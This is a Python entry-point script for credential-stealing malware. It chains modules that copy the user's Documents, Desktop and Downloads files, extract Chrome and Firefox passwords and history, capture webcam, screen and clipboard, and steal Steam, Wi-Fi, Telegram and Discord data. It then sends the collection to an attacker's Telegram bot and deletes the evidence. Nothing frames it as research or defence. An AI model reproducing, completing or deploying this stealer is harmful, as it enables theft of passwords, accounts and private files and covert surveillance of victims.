import createfolders
import getpass
import processes
import passwordsChrome
import texts
import webcam
import passwordsWifi
import os
import infoabpc
import telgBot
import steamthief
import firefox_decrypt
import makeitclean
import screen
import telegram
import discordu
import bufer

if __name__ == "__main__":
    Chat_id = 'from this telegram bot - https://t.me/getmyid_bot'
    Token = 'from this telegram bot - https://t.me/BotFather'

    createfolders.create_all()

    current_user = getpass.getuser()
    path1 = os.path.join("C:\\Users", current_user, "Documents")
    path2 = os.path.join("C:\\Users", current_user, "Desktop")
    path3 = os.path.join("C:\\Users", current_user, "Downloads")
    destin1 = os.path.join(r'C:\Min\texts', 'documents')
    destin2 = os.path.join(r'C:\Min\texts', 'desktop')
    destin3 = os.path.join(r'C:\Min\texts', 'downloads')
    destinpng1 = os.path.join(r'C:\Min\texts\documents', 'images')
    destinpng2 = os.path.join(r'C:\Min\texts\desktop', 'images')
    destinpng3 = os.path.join(r'C:\Min\texts\downloads', 'images')

    texts.proverka(path1, destin1)

    texts.proverka(path2, destin2)

    texts.proverka(path3, destin3)

    passwordsChrome.main()

    passwordsChrome.get_chrome_history()

    firefox_decrypt.run_ffdecrypt()

    webcam.get_webcam()

    screen.screenimg()

    bufer.get_bufer()

    steamthief.steamthiefch()

    passwordsWifi.get_all_passwords()

    processes.all_processes()

    telegram.telega()

    discordu.discordik()

    infoabpc.gather_system()

    telgBot.send(Chat_id, Token)

    makeitclean.delete_all()